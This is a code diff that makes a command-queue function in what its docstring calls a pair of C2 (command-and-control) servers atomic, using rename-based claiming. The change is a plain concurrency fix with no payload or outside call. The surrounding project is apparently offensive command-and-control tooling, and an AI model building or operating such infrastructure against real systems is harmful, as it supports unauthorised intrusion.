@@ -49,7 +49,13 @@ def log(line):
 
 
 def next_command():
-    """Pop the oldest queued command file and return its JSON content, or None."""
+    """Pop the oldest queued command file and return its JSON content, or None.
+
+    Atomic claim via os.rename: two C2 servers (HTTP + WS) share the queue
+    dir, and a plain read+unlink races — both can see the same file and one
+    gets a stale/half payload. Rename-to-claimed is atomic, so exactly one
+    server wins each file.
+    """
     try:
         files = sorted(os.listdir(QUEUE_DIR))
     except FileNotFoundError:
@@ -57,14 +63,23 @@ def next_command():
     for fn in files:
         if not fn.endswith(".json"):
             continue
-        path = os.path.join(QUEUE_DIR, fn)
+        src = os.path.join(QUEUE_DIR, fn)
+        claimed = src + ".claimed"
         try:
-            with open(path) as f:
+            os.rename(src, claimed)  # atomic: only one server wins
+        except OSError:
+            continue  # another server claimed it first
+        try:
+            with open(claimed) as f:
                 data = json.load(f)
-            os.unlink(path)
             return data
         except (json.JSONDecodeError, OSError):
             continue
+        finally:
+            try:
+                os.unlink(claimed)
+            except OSError:
+                pass
     return None
 
 
